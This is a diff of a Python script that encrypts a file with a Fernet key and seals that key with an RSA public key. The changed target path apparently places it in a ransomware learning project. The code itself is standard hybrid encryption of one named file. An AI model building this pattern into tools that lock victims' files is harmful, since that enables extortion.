@@ -4,6 +4,11 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 
+"""
+This file is used to encrypt a file using a symmetric key. The symmetric key is encrypted using the public key of the recipient.
+The encrypted key is then saved to a file. That key is then used to encrypt a file.
+"""
+
 symmetricKey = Fernet.generate_key()
 
 FernetInstance = Fernet(symmetricKey)
@@ -23,10 +28,10 @@ encryptedSymmetricKey = public_key.encrypt(
         )
     )
 
-with open("encryptedSymmertricKey.key", "wb") as key_file:
+with open("/keys/encryptedSymmertricKey.key", "wb") as key_file:
     key_file.write(encryptedSymmetricKey)
 
-    filePath = "/keys/FileToEncrypt.txt"
+    filePath = "/ransomware/SecretTextFile.txt"
 
     with open(filePath, "rb") as file:
         file_data = file.read()
